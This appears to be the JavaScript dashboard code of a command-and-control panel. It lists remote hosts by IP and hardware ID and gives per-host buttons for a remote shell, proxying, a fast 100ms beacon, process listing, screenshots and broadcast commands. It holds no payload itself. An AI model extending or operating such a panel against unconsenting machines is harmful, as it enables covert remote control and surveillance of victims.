// HTML entity escaping to prevent XSS from agent-controlled data
function escHtml(str) {
    if (!str) return '';
    return String(str).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/\"/g,'&quot;');
}

window.UI = {
    chart: null,

    initChart() {
        const ctx = document.getElementById('osChart');
        if(!ctx) return;
        
        this.chart = new Chart(ctx.getContext('2d'), {
            type: 'doughnut',
            data: {
                labels: ['Windows', 'Linux', 'Other'],
                datasets: [{
                    data: [0, 0, 0],
                    backgroundColor: ['#3b82f6', '#eab308', '#6b7280'],
                    borderWidth: 0
                }]
            },
            options: { responsive: true, plugins: { legend: { position: 'right', labels: { color: '#fff' } } } }
        });
    },

    updateStats(hosts) {
        document.getElementById('stat-total').innerText = hosts.length;
        const wins = hosts.filter(h => h.os.toLowerCase().includes('windows')).length;
        const linux = hosts.filter(h => h.os.toLowerCase().includes('linux')).length;
        document.getElementById('stat-win').innerText = wins;
        document.getElementById('stat-linux').innerText = linux;

        if (this.chart) {
            this.chart.data.datasets[0].data = [wins, linux, hosts.length - (wins + linux)];
            this.chart.update();
        }
    },

    updateConnectionStatus(isConnected) {
        const el = document.getElementById('connection-status');
        if(isConnected) {
            el.innerHTML = `<div class="w-2 h-2 rounded-full bg-green-500 animate-pulse"></div> Connected`;
            el.classList.replace('text-red-400', 'text-green-400');
        } else {
            el.innerHTML = `<div class="w-2 h-2 rounded-full bg-red-500"></div> Connection Error`;
            el.classList.replace('text-green-400', 'text-red-400');
        }
    },

    addLog(msg) {
        const box = document.getElementById('activity-log');
        box.innerHTML = `<div class="border-l-2 border-green-500 pl-2">
            <span class="text-xs text-gray-500">${new Date().toLocaleTimeString()}</span>
            <span class="text-gray-300 ml-2">${escHtml(msg)}</span>
        </div>` + box.innerHTML;
    },

    addTaskLog(cmd, targets) {
        const el = document.getElementById('task-list');
        if (!el) return;
        
        el.innerHTML = `
            <div class="bg-gray-900 p-3 rounded border-l-4 border-red-500">
                <div class="flex justify-between text-xs text-gray-400">
                    <span>BROADCAST</span><span>${new Date().toLocaleTimeString()}</span>
                </div>
                <div class="font-mono text-white mt-1">${escHtml(cmd)}</div>
                <div class="text-xs text-green-500 mt-1">Targets Reached: ${targets}</div>
            </div>
        ` + el.innerHTML;
    },

    // --- HOST TABLE LOGIC ---
    updateHostTable(hosts) {
        const tbody = document.getElementById('hosts-table');
        if (!tbody) return;

        this.ensureTableHeader();

        const currentIds = new Set(hosts.map(h => h.id));

        // Remove old rows
        Array.from(tbody.children).forEach(row => {
            if (!currentIds.has(parseInt(row.getAttribute('data-id')))) row.remove();
        });

        // Update or Create Rows
        hosts.forEach(h => {
            let row = document.getElementById(`host-row-${h.id}`);

            if (!row) {
                row = document.createElement('tr');
                row.id = `host-row-${h.id}`;
                row.setAttribute('data-id', h.id);
                row.className = "hover:bg-gray-800/50 transition border-b border-gray-700 last:border-0";
                
                // Structure
                row.innerHTML = `
                    <td class="p-4 font-mono text-xs text-gray-500">#${h.id}</td>
                    <td class="p-4 font-bold text-white host-name"></td>
                    <td class="p-4 text-gray-300 font-mono text-sm host-ip"></td>
                    <td class="p-4 host-os-cell"></td>
                    <td class="p-4 font-mono text-xs text-gray-500 truncate max-w-[100px] host-hwid"></td>
                    <td class="p-4 host-modules"></td> <td class="p-4 text-right host-actions"></td>
                `;
                tbody.appendChild(row);
            }

            // A. Update Text
            const nameEl = row.querySelector('.host-name');
            const staleClass = h.last_seen_secs > 120 ? 'text-yellow-500' : 'text-green-500';
            const seenText = h.last_seen_secs < 60 ? `${h.last_seen_secs}s` : h.last_seen_secs < 3600 ? `${Math.floor(h.last_seen_secs/60)}m` : `${Math.floor(h.last_seen_secs/3600)}h`;
            const tagsHtml = (h.tags || []).map(t => `<span class="px-1.5 py-0.5 rounded text-[10px] bg-green-900/60 text-green-300 mr-1">${escHtml(t)}</span>`).join('');
            nameEl.innerHTML = `${escHtml(h.hostname)} <span class="text-xs font-normal ${staleClass}">${seenText} ago</span>${tagsHtml ? '<br>' + tagsHtml : ''}`;

            const ipEl = row.querySelector('.host-ip');
            if(ipEl.innerText !== h.ip) ipEl.innerText = h.ip;

            const hwidEl = row.querySelector('.host-hwid');
            if(hwidEl.innerText !== h.computer_id) hwidEl.innerText = h.computer_id;

            // B. Update OS Badge
            const osCell = row.querySelector('.host-os-cell');
            const osClass = h.os.toLowerCase().includes('win') ? 'bg-blue-900 text-blue-200' : 'bg-yellow-900 text-yellow-200';
            const osBadge = `<span class="px-2 py-1 rounded text-xs font-bold ${osClass}">${escHtml(h.os)}</span>`;
            if(osCell.innerHTML !== osBadge) osCell.innerHTML = osBadge;

            // C. Update Modules
            const modCell = row.querySelector('.host-modules');
            const activeEl = document.activeElement;
            const isFocusing = activeEl && activeEl.id === `mod-select-${h.id}`;

            if (modCell.innerHTML === "" || (!isFocusing && window.ModuleManager)) {
                const newHtml = window.ModuleManager.renderControls(h.id);
                if(!isFocusing && modCell.innerHTML.length !== newHtml.length) {
                    modCell.innerHTML = newHtml;
                }
            }

            // D. Update Actions (Proxy + Beacon + Shell)
            const actionCell = row.querySelector('.host-actions');
            
            const proxyBtn = h.has_proxy 
                ? `<button onclick="window.ProxyManager.stop(${h.id})" class="text-red-400 hover:text-white border border-red-500 hover:bg-red-600 px-2 py-1 rounded text-xs transition flex items-center gap-1"><i class="fas fa-stop-circle"></i> Stop Proxy</button>`
                : `<button onclick="window.ProxyManager.start(${h.id})" class="text-blue-500 hover:text-white border border-blue-500 hover:bg-blue-600 px-2 py-1 rounded text-xs transition flex items-center gap-1"><i class="fas fa-network-wired"></i> Proxy</button>`;

            // FIX: JSON.stringify(hostname) produces a double-quoted string ("hostname")
            // which terminates the onclick="..." HTML attribute early, leaving truncated
            // JS like `window.Terminal.open(1, ` with no closing paren. Firefox wraps
            // onclick handlers in function(event){CONTENT} so the implicit } at the end
            // of the wrapper becomes the unexpected token → SyntaxError "expected expression,
            // got '}'" at line 2:1, fired once per click. The modal never opens.
            //
            // Fix: store the hostname in a data attribute (HTML-entity-escaped so any
            // character is safe inside a double-quoted attribute) and read it via
            // this.dataset.hostname at click time. The browser decodes entities
            // automatically, so Terminal.open receives the original hostname string.
            const safeHostname = escHtml(h.hostname || '');

            const termBtn = `<button onclick="window.Terminal.open(${h.id}, this.dataset.hostname)" data-hostname="${safeHostname}" class="bg-gray-900 hover:bg-green-600 border border-green-600 hover:text-white text-green-500 px-3 py-1 rounded text-xs transition flex items-center gap-1 ml-2"><i class="fas fa-terminal"></i> Shell</button>`;
            
            // Beacon Toggle Logic
            let beaconBtn = '';
            
            if (h.is_active) {
                // ACTIVE STATE: Red Pulsing Bolt + Ping Animation
                beaconBtn = `<button onclick="window.BeaconManager.toggle(${h.id}, this)" 
                    class="group relative text-red-500 border border-red-500 bg-red-500/10 px-3 py-1 rounded text-xs transition ml-2 shadow-[0_0_10px_rgba(239,68,68,0.5)] animate-pulse" 
                    title="FAST MODE ACTIVE! Click to Deactivate">
                    <i class="fas fa-bolt"></i>
                    <span class="absolute -top-1 -right-1 flex h-2 w-2">
                      <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-red-400 opacity-75"></span>
                      <span class="relative inline-flex rounded-full h-2 w-2 bg-red-500"></span>
                    </span>
                </button>`;
            } else {
                // PASSIVE STATE: Gray Bed Icon
                beaconBtn = `<button onclick="window.BeaconManager.toggle(${h.id}, this)" 
                    class="text-gray-600 border border-gray-700 hover:text-green-400 hover:border-green-500 hover:bg-green-500/10 px-3 py-1 rounded text-xs transition ml-2" 
                    title="Activate Fast Mode (100ms Beacon)">
                    <i class="fas fa-bed"></i>
                </button>`;
            }

            const procBtn   = `<button onclick="window.ProcView.load(${h.id})" class="text-gray-500 hover:text-cyan-400 border border-gray-700 hover:border-cyan-500 px-2 py-1 rounded text-xs transition ml-1" title="Process List"><i class="fas fa-list"></i></button>`;
            const screenBtn = `<button onclick="window.ScreenshotView.capture(${h.id})" class="text-gray-500 hover:text-purple-400 border border-gray-700 hover:border-purple-500 px-2 py-1 rounded text-xs transition ml-1" title="Screenshot"><i class="fas fa-camera"></i></button>`;

            // FIX: same double-quote HTML attribute break as termBtn above.
            const notesBtn  = `<button onclick="window.Notes.show(${h.id}, this.dataset.hostname)" data-hostname="${safeHostname}" class="text-gray-500 hover:text-yellow-400 border border-gray-700 hover:border-yellow-500 px-2 py-1 rounded text-xs transition ml-1" title="Notes & Tags"><i class="fas fa-sticky-note"></i></button>`;

            const actionHtml = `<div class="flex justify-end items-center">${proxyBtn}${beaconBtn}${termBtn}${procBtn}${screenBtn}${notesBtn}</div>`;
            
            if(actionCell.innerHTML !== actionHtml) actionCell.innerHTML = actionHtml;
        });
    },

    ensureTableHeader() {
        const theadRow = document.querySelector('#hosts-table').parentElement.querySelector('thead tr');
        if(theadRow && !theadRow.innerHTML.includes('Scripts')) {
            theadRow.innerHTML = `
                <th class="p-4">ID</th>
                <th class="p-4">Hostname</th>
                <th class="p-4">IP Address</th>
                <th class="p-4">OS</th>
                <th class="p-4">HWID</th>
                <th class="p-4">Scripts</th> <th class="p-4 text-right">Action</th>
            `;
        }
    }
};
